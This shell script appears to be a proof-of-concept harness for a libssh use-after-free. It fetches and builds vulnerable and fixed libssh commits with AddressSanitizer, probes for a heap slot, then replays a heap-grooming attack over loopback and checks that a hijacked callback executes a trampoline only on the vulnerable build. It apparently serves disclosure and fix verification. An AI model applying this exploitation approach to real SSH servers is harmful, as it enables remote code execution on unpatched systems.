#!/bin/sh
# W24 additive lane: the callback iterator that continues channel_rcv_data()'s
# already-running ssh_callbacks_iterate loop is refilled from the same wire
# packet that recycles the freed channel. No app-owned callbacks struct or
# iterator values remain. ASan build, as in W16, makes the recycled slot
# reproducible; no library source change, loopback only.
set -u
cd "$(dirname "$0")" || exit 1
HERE=$(pwd)

V=a540e27659b08828ef61f2910a790f7cf2af9f8d
F=7dfabb1fd213196c4912c314b418ff36c882ea54
VS=libssh-mirror-$V
FS=libssh-mirror-$F

provision() {
    sha=$1; dir=$2
    if [ ! -d "$dir" ]; then
        curl -fsSL --max-time 60 \
            "https://codeload.github.com/libssh/libssh-mirror/tar.gz/$sha" \
            -o "$dir.tar.gz" || return 1
        tar -xzf "$dir.tar.gz" || return 1
    fi
}

build_asan() {
    dir=$1; out=$2
    cmake -S "$dir" -B "$out" -G Ninja \
        -DCMAKE_BUILD_TYPE=Debug -DCMAKE_C_COMPILER=clang \
        -DWITH_SERVER=ON -DUNIT_TESTING=OFF -DBUILD_SHARED_LIBS=OFF \
        -DWITH_GSSAPI=OFF -DWITH_ZLIB=OFF >"$out.configure.log" 2>&1 &&
    ninja -C "$out" ssh >"$out.build.log" 2>&1
}

provision "$V" "$VS" && provision "$F" "$FS" || exit 1
for pair in "$VS build-asan vuln" "$FS build-fixed fixed"; do
    set -- $pair
    src=$1; b=$2; kind=$3
    build_asan "$src" "$b" || exit 1
    clang -std=gnu99 -O1 -g -fsanitize=address -fno-omit-frame-pointer \
        -DW13_INLINE -DW24_WIRELIST \
        -I"$b/src" -I"$src/src" -I"$src/include" -I"$b/include" -I"$b" \
        real_wire.c "$b/src/libssh.a" -lcrypto -lpthread -ldl \
        -o "real_wire-wl-$kind" || exit 1
done

if [ ! -f hostkey ]; then
    ssh-keygen -q -t ed25519 -N '' -f hostkey </dev/null >/dev/null 2>&1 || exit 1
fi

# Same build, one probe run: the allocator slot depends on build path and
# harness text, so a constant would not survive a clean-archive replay.
mkdir -p wirelist-run/probe
ln -sf "$HERE/hostkey" wirelist-run/probe/hostkey
(cd wirelist-run/probe && \
    ASAN_OPTIONS=detect_leaks=0:quarantine_size_mb=0 timeout 25 \
    "$HERE/real_wire-wl-vuln" ./hostkey groom-nodetach-bare) \
    >evidence-wl-probe.out 2>&1
slot=$(grep -o 'SERVER groom alloc=0x[0-9a-f]*' evidence-wl-probe.out |
       head -1 | sed 's/.*alloc=//')
if [ -z "$slot" ]; then
    echo "FAIL-probe no groom slot in evidence-wl-probe.out"
    exit 1
fi
echo "probe slot=$slot"

PASS=0; FAIL=0
run_lane() {
    n_name=$1; n_kind=$2; n_mode=$3
    mkdir -p "wirelist-run/$n_name"
    ln -sf "$HERE/hostkey" "wirelist-run/$n_name/hostkey"
    (cd "wirelist-run/$n_name" && \
        ASAN_OPTIONS=detect_leaks=0:quarantine_size_mb=0 timeout 25 \
        "$HERE/real_wire-wl-$n_kind" ./hostkey "$n_mode" "$slot") \
        >"evidence-wl-$n_name.out" 2>&1
    echo "lane $n_name rc=$?"
}

check_vuln() {
    c_out=evidence-wl-$1.out
    c_file=no
    [ -f "wirelist-run/$1/evidence-wire-vuln-groom-exec.marker" ] && c_file=yes
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_t=$(grep -c 'SERVER target_after=0x41414141414141c1' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$c_out")
    c_w=$(grep -c 'SERVER wirelist it=' "$c_out")
    c_det=$(grep -c 'SERVER groom-survive saved' "$c_out")
    if [ "$c_d2" = 1 ] && [ "$c_t" = 1 ] && [ "$c_e" = 1 ] &&
       [ "$c_ok" = 1 ] && [ "$c_w" = 1 ] && [ "$c_det" = 0 ] &&
       [ "$c_file" = yes ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=$c_d2 target=$c_t exec=$c_e wirelist=$c_w file=$c_file"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_t $c_e $c_ok $c_w $c_det $c_file]"
    fi
}

check_fixed() {
    c_out=evidence-wl-$1.out
    c_file=no
    [ -f "wirelist-run/$1/evidence-wire-vuln-groom-exec.marker" ] && c_file=yes
    c_d2=$(grep -c 'SERVER data #2' "$c_out")
    c_t=$(grep -c 'SERVER target_after=0x41414141414141c1' "$c_out")
    c_e=$(grep -c 'SERVER EXEC trampoline' "$c_out")
    c_w=$(grep -c 'SERVER wirelist it=' "$c_out")
    if [ "$c_d2" = 0 ] && [ "$c_t" = 0 ] && [ "$c_e" = 0 ] &&
       [ "$c_w" = 0 ] && [ "$c_file" = no ]; then
        PASS=$((PASS+1)); echo "PASS-$1 data2=0 target=0 exec=0 wirelist=0 file=no"
    else
        FAIL=$((FAIL+1)); echo "FAIL-$1 got[$c_d2 $c_t $c_e $c_w $c_file]"
    fi
}

run_lane vuln-wirelist vuln groom-wirelist
check_vuln vuln-wirelist
if [ -f wirelist-run/vuln-wirelist/evidence-wire-vuln-groom-exec.marker ]; then
    mv wirelist-run/vuln-wirelist/evidence-wire-vuln-groom-exec.marker \
       evidence-wl-sideeffect.kept
fi

run_lane fixed-wirelist fixed groom-wirelist
check_fixed fixed-wirelist

# Wire-selected callee control: invalid callee must fault at the library call.
run_lane vuln-wirelist-bad vuln groom-wirelist-bad
b_out=evidence-wl-vuln-wirelist-bad.out
b_status=$(grep -c 'CLIENT rc=0 SERVER status=0x' "$b_out")
b_ok=$(grep -c 'CLIENT rc=0 SERVER status=0x0' "$b_out")
b_e=$(grep -c 'SERVER EXEC trampoline' "$b_out")
b_done=$(grep -c 'SERVER done data_packets=2' "$b_out")
if [ "$b_status" = 1 ] && [ "$b_ok" = 0 ] && [ "$b_e" = 0 ] && [ "$b_done" = 0 ]; then
    PASS=$((PASS+1)); echo "PASS-vuln-wirelist-bad server_fault=yes exec=no server_done=no"
else
    FAIL=$((FAIL+1)); echo "FAIL-vuln-wirelist-bad got[status=$b_status clean=$b_ok exec=$b_e done=$b_done]"
fi

for i in 1 2 3; do
    run_lane "vuln-repeat$i" vuln groom-wirelist
    check_vuln "vuln-repeat$i"
    if [ -f "wirelist-run/vuln-repeat$i/evidence-wire-vuln-groom-exec.marker" ]; then
        mv "wirelist-run/vuln-repeat$i/evidence-wire-vuln-groom-exec.marker" \
           "evidence-wl-repeat$i.kept"
    fi
done

echo "wirelist: $PASS PASS / $FAIL FAIL"
[ "$FAIL" -eq 0 ]
